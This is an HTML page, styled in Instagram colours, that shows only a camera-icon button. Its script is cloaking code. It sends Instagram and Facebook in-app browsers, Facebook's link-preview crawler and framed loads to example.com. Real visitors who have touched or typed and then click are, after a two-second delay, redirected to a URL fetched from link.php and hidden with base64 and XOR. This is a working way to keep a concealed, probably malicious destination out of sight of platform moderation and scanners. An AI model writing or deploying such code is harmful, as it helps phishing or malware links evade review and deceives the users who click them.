<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>ðŸ“·</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      background: white;
      border-radius: 9999px;
      padding: 0.6rem 1.4rem;
      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
      display: flex;
      align-items: center;
      gap: 0.5rem;
      cursor: pointer;
      transition: transform 0.2s ease;
    }

    .container:hover {
      transform: scale(1.05);
    }

    .icon {
      background: black;
      color: white;
      border-radius: 50%;
      padding: 0.5rem;
      font-size: 1.2rem;
      display: flex;
      align-items: center;
      justify-content: center;
    }
  </style>
</head>
<body>
  <div class="container" id="realButton">
    <div class="icon">ðŸ“·</div>
  </div>

  <script>
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const isInsta = ua.includes("instagram") || ua.includes("facebookexternalhit") || ua.includes("fbav") || ua.includes("fbios");
      const isIframe = window.top !== window.self;
      if (isInsta || isIframe) {
        location.href = "https://example.com";
        return;
      }
    })();

    let interacted = false;
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    document.getElementById("realButton").addEventListener("click", function () {
      if (!interacted) return;
      setTimeout(() => {
        fetch("link.php")
          .then(res => res.text())
          .then(code => {
            const decoded = atob(code.trim());
            const xorKey = 3;
            const finalURL = decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey)).join('');
            location.href = finalURL;
          });
      }, 2000);
    });
  </script>
</body>
</html>
